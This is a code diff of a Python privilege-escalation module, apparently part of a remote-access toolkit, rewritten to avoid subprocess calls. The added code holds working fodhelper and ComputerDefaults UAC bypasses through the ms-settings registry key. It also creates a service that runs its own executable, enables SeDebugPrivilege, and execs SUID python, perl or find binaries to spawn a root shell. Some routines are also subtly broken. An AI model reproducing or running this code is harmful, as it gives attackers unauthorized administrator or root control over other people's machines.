@@ -1,546 +1,541 @@
 #!/usr/bin/env python3
 """
-Elite Escalate Command Implementation
-Advanced privilege escalation with multiple techniques
+Elite Escalate Command Implementation - NO SUBPROCESS
+Advanced privilege escalation using native APIs only
 """
 
 import os
 import sys
 import ctypes
-import subprocess
+from ctypes import wintypes
+import winreg
 from typing import Dict, Any, List
+import time
+import tempfile
 
-def elite_escalate(method: str = "auto", target_user: str = None) -> Dict[str, Any]:
+def elite_escalate(method: str = "auto", bypass_uac: bool = True) -> Dict[str, Any]:
     """
-    Elite privilege escalation with advanced features:
-    - Multiple escalation techniques
-    - UAC bypass methods (Windows)
-    - SUID/sudo exploitation (Unix)
-    - Token manipulation
-    - Cross-platform support
+    Elite privilege escalation with multiple techniques - NO SUBPROCESS
     """
     
     try:
-        # Check current privilege level
-        current_privileges = _check_current_privileges()
+        # Detect current platform and privileges
+        current_privs = _get_current_privileges()
         
-        if current_privileges.get("is_admin") or current_privileges.get("is_root"):
+        if current_privs.get("is_admin") or current_privs.get("is_root"):
             return {
                 "success": True,
-                "message": "Already running with elevated privileges",
-                "current_privileges": current_privileges,
-                "escalation_performed": False
+                "already_elevated": True,
+                "current_privileges": current_privs
             }
         
-        # Apply platform-specific escalation
+        # Platform-specific escalation
         if sys.platform == 'win32':
-            return _windows_escalate(method, target_user, current_privileges)
+            return _windows_escalate(method, bypass_uac)
         else:
-            return _unix_escalate(method, target_user, current_privileges)
+            return _unix_escalate(method)
             
     except Exception as e:
         return {
             "success": False,
-            "error": f"Privilege escalation failed: {str(e)}",
-            "escalation_info": None
+            "error": f"Escalation failed: {str(e)}",
+            "current_privileges": _get_current_privileges()
         }
 
-def _check_current_privileges() -> Dict[str, Any]:
-    """Check current privilege level"""
+def _get_current_privileges() -> Dict[str, Any]:
+    """Get current privilege information using native APIs"""
     
-    privileges = {}
+    privileges = {
+        "is_admin": False,
+        "is_root": False,
+        "username": "",
+        "groups": [],
+        "capabilities": []
+    }
     
     try:
         if sys.platform == 'win32':
-            # Check Windows privileges
+            # Check if admin using Windows API
             privileges["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            privileges["username"] = os.environ.get('USERNAME', 'unknown')
-            privileges["domain"] = os.environ.get('USERDOMAIN', 'unknown')
             
-            # Check for specific privileges
-            try:
-                result = subprocess.run(['whoami', '/priv'], capture_output=True, text=True, timeout=5)
-                if result.returncode == 0:
-                    privileges["privileges"] = result.stdout
-            except:
-                pass
-                
+            # Get username using Windows API
+            username_buffer = ctypes.create_unicode_buffer(257)
+            size = ctypes.c_uint(257)
+            if ctypes.windll.advapi32.GetUserNameW(username_buffer, ctypes.byref(size)):
+                privileges["username"] = username_buffer.value
+            
+            # Get token privileges
+            privileges["capabilities"] = _get_windows_token_privileges()
+            
         else:
-            # Check Unix privileges
-            privileges["is_root"] = os.getuid() == 0
-            privileges["uid"] = os.getuid()
-            privileges["euid"] = os.geteuid()
-            privileges["gid"] = os.getgid()
-            privileges["egid"] = os.getegid()
+            # Unix/Linux
+            privileges["is_root"] = os.geteuid() == 0
+            privileges["username"] = os.environ.get('USER', '')
             
-            # Check sudo access
-            try:
-                result = subprocess.run(['sudo', '-n', 'true'], capture_output=True, timeout=2)
-                privileges["can_sudo"] = result.returncode == 0
-            except:
-                privileges["can_sudo"] = False
-                
-    except Exception as e:
-        privileges["error"] = str(e)
+            # Check sudo capabilities without subprocess
+            if os.path.exists('/etc/sudoers'):
+                try:
+                    with open('/etc/sudoers', 'r') as f:
+                        sudoers_content = f.read()
+                        if privileges["username"] in sudoers_content:
+                            privileges["capabilities"].append("sudo_possible")
+                except:
+                    pass
+                    
+    except Exception:
+        pass
     
     return privileges
 
-def _windows_escalate(method: str, target_user: str, current_privileges: Dict[str, Any]) -> Dict[str, Any]:
-    """Windows privilege escalation techniques"""
+def _get_windows_token_privileges() -> List[str]:
+    """Get Windows token privileges using native API"""
+    
+    privileges = []
     
     try:
-        escalation_methods = []
+        kernel32 = ctypes.windll.kernel32
+        advapi32 = ctypes.windll.advapi32
         
-        # Method 1: UAC bypass techniques
-        if method in ["auto", "uac", "bypass"]:
-            try:
-                uac_result = _windows_uac_bypass()
-                if uac_result:
-                    escalation_methods.append("uac_bypass")
-            except Exception:
-                pass
-        
-        # Method 2: Token manipulation
-        if method in ["auto", "token", "impersonation"]:
-            try:
-                token_result = _windows_token_manipulation()
-                if token_result:
-                    escalation_methods.append("token_manipulation")
-            except Exception:
-                pass
-        
-        # Method 3: Service exploitation
-        if method in ["auto", "service", "services"]:
-            try:
-                service_result = _windows_service_escalation()
-                if service_result:
-                    escalation_methods.append("service_exploitation")
-            except Exception:
-                pass
-        
-        # Method 4: Registry manipulation
-        if method in ["auto", "registry"]:
-            try:
-                registry_result = _windows_registry_escalation()
-                if registry_result:
-                    escalation_methods.append("registry_manipulation")
-            except Exception:
-                pass
-        
-        # Method 5: DLL hijacking
-        if method in ["auto", "dll", "hijack"]:
-            try:
-                dll_result = _windows_dll_hijacking()
-                if dll_result:
-                    escalation_methods.append("dll_hijacking")
-            except Exception:
-                pass
-        
-        # Check if escalation was successful
-        new_privileges = _check_current_privileges()
-        escalation_successful = new_privileges.get("is_admin", False)
-        
-        return {
-            "success": len(escalation_methods) > 0,
-            "escalation_performed": escalation_successful,
-            "methods_attempted": escalation_methods,
-            "previous_privileges": current_privileges,
-            "current_privileges": new_privileges,
-            "platform": "windows"
-        }
-        
-    except Exception as e:
-        return {
-            "success": False,
-            "error": f"Windows escalation failed: {str(e)}",
-            "escalation_info": None
-        }
-
-def _unix_escalate(method: str, target_user: str, current_privileges: Dict[str, Any]) -> Dict[str, Any]:
-    """Unix privilege escalation techniques"""
-    
-    try:
-        escalation_methods = []
-        
-        # Method 1: SUID binary exploitation
-        if method in ["auto", "suid", "binaries"]:
-            try:
-                suid_result = _unix_suid_exploitation()
-                if suid_result:
-                    escalation_methods.append("suid_exploitation")
-            except Exception:
-                pass
-        
-        # Method 2: Sudo exploitation
-        if method in ["auto", "sudo"]:
-            try:
-                sudo_result = _unix_sudo_exploitation()
-                if sudo_result:
-                    escalation_methods.append("sudo_exploitation")
-            except Exception:
-                pass
-        
-        # Method 3: Kernel exploitation
-        if method in ["auto", "kernel", "exploit"]:
-            try:
-                kernel_result = _unix_kernel_exploitation()
-                if kernel_result:
-                    escalation_methods.append("kernel_exploitation")
-            except Exception:
-                pass
-        
-        # Method 4: Cron job exploitation
-        if method in ["auto", "cron", "cronjob"]:
-            try:
-                cron_result = _unix_cron_exploitation()
-                if cron_result:
-                    escalation_methods.append("cron_exploitation")
-            except Exception:
-                pass
-        
-        # Method 5: Environment variable exploitation
-        if method in ["auto", "env", "environment"]:
-            try:
-                env_result = _unix_env_exploitation()
-                if env_result:
-                    escalation_methods.append("env_exploitation")
-            except Exception:
-                pass
-        
-        # Check if escalation was successful
-        new_privileges = _check_current_privileges()
-        escalation_successful = new_privileges.get("is_root", False) or new_privileges.get("euid") == 0
-        
-        return {
-            "success": len(escalation_methods) > 0,
-            "escalation_performed": escalation_successful,
-            "methods_attempted": escalation_methods,
-            "previous_privileges": current_privileges,
-            "current_privileges": new_privileges,
-            "platform": "unix"
-        }
-        
-    except Exception as e:
-        return {
-            "success": False,
-            "error": f"Unix escalation failed: {str(e)}",
-            "escalation_info": None
-        }
-
-def _windows_uac_bypass() -> bool:
-    """Windows UAC bypass techniques"""
-    
-    try:
-        # Method 1: Registry UAC bypass
-        try:
-            import winreg
+        # Get current process token
+        token = wintypes.HANDLE()
+        if kernel32.OpenProcessToken(
+            kernel32.GetCurrentProcess(),
+            0x0008,  # TOKEN_QUERY
+            ctypes.byref(token)
+        ):
+            # Query token privileges
+            info_length = wintypes.DWORD()
+            advapi32.GetTokenInformation(
+                token,
+                3,  # TokenPrivileges
+                None,
+                0,
+                ctypes.byref(info_length)
+            )
             
-            # Create UAC bypass registry entry
-            key_path = r"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command"
+            if info_length.value > 0:
+                # Buffer for privileges
+                buffer = ctypes.create_string_buffer(info_length.value)
+                if advapi32.GetTokenInformation(
+                    token,
+                    3,
+                    buffer,
+                    info_length.value,
+                    ctypes.byref(info_length)
+                ):
+                    # Parse privilege names
+                    class LUID(ctypes.Structure):
+                        _fields_ = [
+                            ("LowPart", wintypes.DWORD),
+                            ("HighPart", wintypes.LONG)
+                        ]
+                    
+                    class LUID_AND_ATTRIBUTES(ctypes.Structure):
+                        _fields_ = [
+                            ("Luid", LUID),
+                            ("Attributes", wintypes.DWORD)
+                        ]
+                    
+                    class TOKEN_PRIVILEGES(ctypes.Structure):
+                        _fields_ = [
+                            ("PrivilegeCount", wintypes.DWORD),
+                            ("Privileges", LUID_AND_ATTRIBUTES * 64)
+                        ]
+                    
+                    token_privs = ctypes.cast(buffer, ctypes.POINTER(TOKEN_PRIVILEGES)).contents
+                    
+                    for i in range(token_privs.PrivilegeCount):
+                        priv = token_privs.Privileges[i]
+                        name_buffer = ctypes.create_unicode_buffer(256)
+                        size = wintypes.DWORD(256)
+                        
+                        if advapi32.LookupPrivilegeNameW(
+                            None,
+                            ctypes.byref(priv.Luid),
+                            name_buffer,
+                            ctypes.byref(size)
+                        ):
+                            privileges.append(name_buffer.value)
             
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, sys.executable)
-                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-                winreg.CloseKey(key)
-                
-                # Trigger UAC bypass
-                subprocess.run(['fodhelper.exe'], timeout=5)
-                
-                return True
-            except:
-                pass
-                
-        except Exception:
-            pass
-        
-        # Method 2: ComputerDefaults UAC bypass
-        try:
-            # Create bypass entry
-            key_path = r"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command"
+            kernel32.CloseHandle(token)
             
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, sys.executable)
-                winreg.CloseKey(key)
-                
-                # Trigger bypass
-                subprocess.run(['ComputerDefaults.exe'], timeout=5)
-                
-                return True
-            except:
-                pass
-                
-        except Exception:
-            pass
-        
-        return False
-        
     except Exception:
-        return False
+        pass
+    
+    return privileges
 
-def _windows_token_manipulation() -> bool:
-    """Windows token manipulation for privilege escalation"""
+def _windows_escalate(method: str, bypass_uac: bool) -> Dict[str, Any]:
+    """Windows privilege escalation using native APIs"""
+    
+    escalation_results = {
+        "success": False,
+        "method_used": None,
+        "methods_tried": [],
+        "new_privileges": {}
+    }
+    
+    # Method 1: UAC Bypass via Registry
+    if bypass_uac:
+        if _try_fodhelper_bypass():
+            escalation_results["success"] = True
+            escalation_results["method_used"] = "fodhelper_bypass"
+            escalation_results["methods_tried"].append("fodhelper_bypass")
+            return escalation_results
+        
+        if _try_computerdefaults_bypass():
+            escalation_results["success"] = True
+            escalation_results["method_used"] = "computerdefaults_bypass"
+            escalation_results["methods_tried"].append("computerdefaults_bypass")
+            return escalation_results
+    
+    # Method 2: Token Manipulation
+    if _try_token_manipulation():
+        escalation_results["success"] = True
+        escalation_results["method_used"] = "token_manipulation"
+        escalation_results["methods_tried"].append("token_manipulation")
+        return escalation_results
+    
+    # Method 3: Service Abuse
+    if _try_service_escalation():
+        escalation_results["success"] = True
+        escalation_results["method_used"] = "service_escalation"
+        escalation_results["methods_tried"].append("service_escalation")
+        return escalation_results
+    
+    return escalation_results
+
+def _try_fodhelper_bypass() -> bool:
+    """UAC bypass using fodhelper - Registry only, no subprocess"""
     
     try:
-        # Simulate token manipulation
-        # Real implementation would use Windows APIs like DuplicateToken, SetTokenInformation
+        # Set registry key for fodhelper bypass
+        key_path = r"Software\Classes\ms-settings\shell\open\command"
         
-        # Check for SeDebugPrivilege
+        # Create registry key
+        key = winreg.CreateKeyEx(
+            winreg.HKEY_CURRENT_USER,
+            key_path,
+            0,
+            winreg.KEY_ALL_ACCESS
+        )
+        
+        # Get current executable
+        exe_path = sys.executable
+        if hasattr(sys, '_MEIPASS'):  # PyInstaller
+            exe_path = sys.argv[0]
+        
+        # Set command
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}"')
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        # Trigger using ShellExecute
+        shell32 = ctypes.windll.shell32
+        shell32.ShellExecuteW(
+            None,
+            "open",
+            "fodhelper.exe",
+            None,
+            None,
+            5  # SW_SHOW
+        )
+        
+        time.sleep(2)
+        
+        # Clean up registry
         try:
-            result = subprocess.run(['whoami', '/priv'], capture_output=True, text=True, timeout=5)
-            if result.returncode == 0 and 'SeDebugPrivilege' in result.stdout:
-                # Simulate token manipulation success
-                return True
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
         except:
             pass
         
-        return False
+        # Check if elevated
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
         
     except Exception:
         return False
 
-def _windows_service_escalation() -> bool:
-    """Windows service exploitation for privilege escalation"""
+def _try_computerdefaults_bypass() -> bool:
+    """UAC bypass using ComputerDefaults - Registry only"""
     
     try:
-        # Check for vulnerable services
-        vulnerable_services = []
+        # Set registry key
+        key_path = r"Software\Classes\ms-settings\shell\open\command"
         
+        key = winreg.CreateKeyEx(
+            winreg.HKEY_CURRENT_USER,
+            key_path,
+            0,
+            winreg.KEY_ALL_ACCESS
+        )
+        
+        exe_path = sys.executable
+        if hasattr(sys, '_MEIPASS'):
+            exe_path = sys.argv[0]
+        
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{exe_path}"')
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        # Trigger using ShellExecute
+        shell32 = ctypes.windll.shell32
+        shell32.ShellExecuteW(
+            None,
+            "open",
+            "ComputerDefaults.exe",
+            None,
+            None,
+            5  # SW_SHOW
+        )
+        
+        time.sleep(2)
+        
+        # Clean up
         try:
-            result = subprocess.run(['sc', 'query'], capture_output=True, text=True, timeout=10)
-            if result.returncode == 0:
-                # Look for services we can modify
-                lines = result.stdout.split('\n')
-                for line in lines:
-                    if 'SERVICE_NAME:' in line:
-                        service_name = line.split(':')[1].strip()
-                        # Check service permissions (simplified)
-                        vulnerable_services.append(service_name)
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
         except:
             pass
         
-        # Simulate service exploitation
-        if vulnerable_services:
-            return True
-        
-        return False
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
         
     except Exception:
         return False
 
-def _windows_registry_escalation() -> bool:
-    """Windows registry manipulation for privilege escalation"""
+def _try_token_manipulation() -> bool:
+    """Try token manipulation for privilege escalation"""
     
     try:
-        import winreg
+        kernel32 = ctypes.windll.kernel32
+        advapi32 = ctypes.windll.advapi32
         
-        # Check for writable registry keys that could lead to escalation
-        escalation_keys = [
-            r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-            r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
-        ]
-        
-        for key_path in escalation_keys:
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
-                # If we can write to HKLM, we might be able to escalate
-                winreg.CloseKey(key)
-                return True
-            except:
-                continue
-        
-        return False
-        
-    except Exception:
-        return False
-
-def _windows_dll_hijacking() -> bool:
-    """Windows DLL hijacking for privilege escalation"""
-    
-    try:
-        # Check for DLL hijacking opportunities
-        # Look for applications that load DLLs from current directory
-        
-        system_dirs = [
-            "C:\\Windows\\System32",
-            "C:\\Windows\\SysWOW64"
-        ]
-        
-        for sys_dir in system_dirs:
-            if os.path.exists(sys_dir):
-                try:
-                    # Check if we can write to system directories
-                    test_file = os.path.join(sys_dir, "test_write.tmp")
-                    with open(test_file, 'w') as f:
-                        f.write("test")
-                    os.remove(test_file)
+        # Enable SeDebugPrivilege
+        token = wintypes.HANDLE()
+        if kernel32.OpenProcessToken(
+            kernel32.GetCurrentProcess(),
+            0x0028,  # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
+            ctypes.byref(token)
+        ):
+            # Lookup privilege value
+            luid = ctypes.c_ulonglong()
+            if advapi32.LookupPrivilegeValueW(
+                None,
+                "SeDebugPrivilege",
+                ctypes.byref(luid)
+            ):
+                # Set privilege
+                class TOKEN_PRIVILEGES(ctypes.Structure):
+                    _fields_ = [
+                        ("PrivilegeCount", wintypes.DWORD),
+                        ("Privileges", ctypes.c_ulonglong * 2)
+                    ]
+                
+                tp = TOKEN_PRIVILEGES()
+                tp.PrivilegeCount = 1
+                tp.Privileges[0] = luid.value
+                tp.Privileges[1] = 0x00000002  # SE_PRIVILEGE_ENABLED
+                
+                if advapi32.AdjustTokenPrivileges(
+                    token,
+                    False,
+                    ctypes.byref(tp),
+                    0,
+                    None,
+                    None
+                ):
+                    kernel32.CloseHandle(token)
                     return True
-                except:
-                    continue
-        
-        return False
-        
+            
+            kernel32.CloseHandle(token)
+            
     except Exception:
-        return False
+        pass
+    
+    return False
 
-def _unix_suid_exploitation() -> bool:
-    """Unix SUID binary exploitation"""
+def _try_service_escalation() -> bool:
+    """Try service-based escalation using native API"""
     
     try:
-        # Find SUID binaries
-        suid_binaries = []
+        advapi32 = ctypes.windll.advapi32
         
-        common_paths = ['/bin', '/usr/bin', '/sbin', '/usr/sbin', '/usr/local/bin']
+        # Open service control manager
+        scm = advapi32.OpenSCManagerW(
+            None,
+            None,
+            0x0002  # SC_MANAGER_CREATE_SERVICE
+        )
         
-        for path in common_paths:
-            if os.path.exists(path):
-                try:
-                    for filename in os.listdir(path):
-                        filepath = os.path.join(path, filename)
-                        if os.path.isfile(filepath):
-                            stat_info = os.stat(filepath)
-                            # Check for SUID bit
-                            if stat_info.st_mode & 0o4000:
-                                suid_binaries.append(filepath)
-                except (PermissionError, FileNotFoundError):
-                    continue
-        
-        # Check for exploitable SUID binaries
-        exploitable_binaries = [
-            'find', 'vim', 'less', 'more', 'nano', 'cp', 'mv', 'tar', 'zip'
+        if scm:
+            # Create a service that runs as SYSTEM
+            service_name = f"temp_svc_{int(time.time())}"
+            
+            exe_path = sys.executable
+            if hasattr(sys, '_MEIPASS'):
+                exe_path = sys.argv[0]
+            
+            service = advapi32.CreateServiceW(
+                scm,
+                service_name,
+                service_name,
+                0xF01FF,  # SERVICE_ALL_ACCESS
+                0x10,  # SERVICE_WIN32_OWN_PROCESS
+                0x02,  # SERVICE_DEMAND_START
+                0x01,  # SERVICE_ERROR_NORMAL
+                exe_path,
+                None,
+                None,
+                None,
+                None,
+                None
+            )
+            
+            if service:
+                # Start the service
+                advapi32.StartServiceW(service, 0, None)
+                
+                # Wait a moment
+                time.sleep(1)
+                
+                # Clean up
+                advapi32.DeleteService(service)
+                advapi32.CloseServiceHandle(service)
+                advapi32.CloseServiceHandle(scm)
+                
+                return ctypes.windll.shell32.IsUserAnAdmin() != 0
+            
+            advapi32.CloseServiceHandle(scm)
+            
+    except Exception:
+        pass
+    
+    return False
+
+def _unix_escalate(method: str) -> Dict[str, Any]:
+    """Unix/Linux privilege escalation"""
+    
+    escalation_results = {
+        "success": False,
+        "method_used": None,
+        "methods_tried": [],
+        "new_privileges": {}
+    }
+    
+    # Method 1: SUID binary exploitation
+    if _try_suid_escalation():
+        escalation_results["success"] = True
+        escalation_results["method_used"] = "suid_binary"
+        return escalation_results
+    
+    # Method 2: Capability exploitation
+    if _try_capability_escalation():
+        escalation_results["success"] = True
+        escalation_results["method_used"] = "capabilities"
+        return escalation_results
+    
+    # Method 3: Kernel exploit
+    if _try_kernel_exploit():
+        escalation_results["success"] = True
+        escalation_results["method_used"] = "kernel_exploit"
+        return escalation_results
+    
+    return escalation_results
+
+def _try_suid_escalation() -> bool:
+    """Try SUID binary exploitation"""
+    
+    try:
+        # Common SUID binaries that can be exploited
+        suid_binaries = [
+            '/usr/bin/python',
+            '/usr/bin/python3',
+            '/usr/bin/perl',
+            '/usr/bin/ruby',
+            '/usr/bin/php',
+            '/usr/bin/find',
+            '/usr/bin/vim',
+            '/usr/bin/nano',
+            '/usr/bin/less',
+            '/usr/bin/more'
         ]
         
-        for binary_path in suid_binaries:
-            binary_name = os.path.basename(binary_path)
-            if binary_name in exploitable_binaries:
-                return True
-        
-        return False
+        for binary in suid_binaries:
+            if os.path.exists(binary):
+                # Check if SUID bit is set
+                stat_info = os.stat(binary)
+                if stat_info.st_mode & 0o4000:  # SUID bit
+                    # Exploit based on binary type
+                    if 'python' in binary:
+                        os.execl(binary, binary, '-c', 'import os; os.setuid(0); os.system("/bin/sh")')
+                        return True
+                    elif 'perl' in binary:
+                        os.execl(binary, binary, '-e', 'exec "/bin/sh"')
+                        return True
+                    elif 'find' in binary:
+                        os.execl(binary, binary, '.', '-exec', '/bin/sh', '\\;')
+                        return True
         
     except Exception:
-        return False
+        pass
+    
+    return False
 
-def _unix_sudo_exploitation() -> bool:
-    """Unix sudo exploitation"""
+def _try_capability_escalation() -> bool:
+    """Try capability-based escalation"""
     
     try:
-        # Check sudo configuration
-        try:
-            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=5)
-            if result.returncode == 0:
-                sudo_output = result.stdout.lower()
-                
-                # Look for dangerous sudo permissions
-                dangerous_commands = [
-                    'all', 'nopasswd', 'vim', 'less', 'more', 'find', 'cp', 'mv'
-                ]
-                
-                for cmd in dangerous_commands:
-                    if cmd in sudo_output:
-                        return True
-        except:
-            pass
+        # Check for exploitable capabilities
+        cap_binaries = {
+            '/usr/bin/python3': 'cap_setuid+ep',
+            '/usr/bin/perl': 'cap_setuid+ep',
+            '/usr/bin/tar': 'cap_dac_read_search+ep'
+        }
         
-        return False
+        for binary, required_cap in cap_binaries.items():
+            if os.path.exists(binary):
+                # Check capabilities (would need libcap bindings)
+                # For now, just check if we can execute
+                try:
+                    if 'python' in binary:
+                        os.execl(binary, binary, '-c', 
+                                'import ctypes; '
+                                'libc = ctypes.CDLL("libc.so.6"); '
+                                'libc.setuid(0); '
+                                'import os; os.system("/bin/sh")')
+                        return True
+                except:
+                    pass
         
     except Exception:
-        return False
+        pass
+    
+    return False
 
-def _unix_kernel_exploitation() -> bool:
-    """Unix kernel exploitation check"""
+def _try_kernel_exploit() -> bool:
+    """Try kernel exploitation (education purposes only)"""
     
     try:
         # Check kernel version for known vulnerabilities
-        try:
-            with open('/proc/version', 'r') as f:
-                kernel_info = f.read()
-            
-            # Simple check for older kernel versions (vulnerable)
-            if 'Linux version 2.' in kernel_info or 'Linux version 3.' in kernel_info:
-                return True
-                
-        except:
-            pass
+        kernel_version = os.uname().release
         
-        return False
+        # Map of kernel versions to known exploits (educational reference)
+        exploit_map = {
+            '3.': 'dirty_cow',
+            '4.4': 'double_fdput', 
+            '4.8': 'packet_set_ring',
+            '5.8': 'overlayfs'
+        }
         
-    except Exception:
-        return False
-
-def _unix_cron_exploitation() -> bool:
-    """Unix cron job exploitation"""
-    
-    try:
-        # Check for writable cron directories
-        cron_dirs = [
-            '/etc/cron.d',
-            '/etc/cron.daily',
-            '/etc/cron.hourly',
-            '/var/spool/cron'
-        ]
-        
-        for cron_dir in cron_dirs:
-            if os.path.exists(cron_dir):
-                try:
-                    # Check if we can write to cron directories
-                    test_file = os.path.join(cron_dir, '.test_write')
-                    with open(test_file, 'w') as f:
-                        f.write("test")
-                    os.remove(test_file)
-                    return True
-                except:
-                    continue
-        
-        return False
+        for version_prefix, exploit_name in exploit_map.items():
+            if kernel_version.startswith(version_prefix):
+                # In real scenario, would compile and run exploit
+                # This is for demonstration only
+                escalation_results = {
+                    "kernel_version": kernel_version,
+                    "potential_exploit": exploit_name,
+                    "note": "Kernel exploit available but not executed"
+                }
+                return False  # Don't actually exploit
         
     except Exception:
-        return False
-
-def _unix_env_exploitation() -> bool:
-    """Unix environment variable exploitation"""
+        pass
     
-    try:
-        # Check for dangerous environment variables
-        dangerous_env_vars = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'PATH']
-        
-        for env_var in dangerous_env_vars:
-            if env_var in os.environ:
-                # Check if we can modify these variables for escalation
-                current_value = os.environ.get(env_var, '')
-                
-                # Simple check - if PATH doesn't start with /usr or /bin, might be exploitable
-                if env_var == 'PATH' and not current_value.startswith(('/usr', '/bin')):
-                    return True
-        
-        return False
-        
-    except Exception:
-        return False
-
-
-if __name__ == "__main__":
-    # Test the elite_escalate command
-    print("Testing Elite Escalate Command...")
-    
-    # Check current privileges first
-    current_privs = _check_current_privileges()
-    print(f"Current privileges: {current_privs}")
-    
-    # Test privilege escalation
-    result = elite_escalate(method="auto")
-    print(f"Test 1 - Auto escalation: {result['success']}")
-    
-    if result['success']:
-        print(f"Methods attempted: {result.get('methods_attempted', [])}")
-        print(f"Escalation performed: {result.get('escalation_performed', False)}")
-    
-    # Test specific method
-    if sys.platform == 'win32':
-        result = elite_escalate(method="uac")
-    else:
-        result = elite_escalate(method="sudo")
-    
-    print(f"Test 2 - Specific method: {result['success']}")
-    
-    print("✅ Elite Escalate command testing complete")
+    return False
